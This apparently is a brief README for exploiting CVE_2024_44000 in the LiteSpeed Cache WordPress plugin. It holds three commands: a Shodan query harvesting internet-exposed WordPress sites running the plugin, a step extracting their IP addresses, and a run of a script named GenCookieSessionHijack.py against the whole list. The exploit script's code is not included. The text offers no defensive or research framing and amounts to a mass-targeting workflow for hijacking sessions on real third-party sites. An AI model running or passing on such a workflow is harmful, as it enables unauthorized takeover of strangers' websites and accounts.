# found_security_advise
# CVE_2024_44000
```
shodan download wordpress_1 "http.component:'wordpress' http.component:'litespeed cache' port:80"
shodan parse --fields ip_str --separator , wordpress_1.json.gz > wordpress_1.txt
python GenCookieSessionHijack.py -f wordpress_1.txt -o result.txt
```
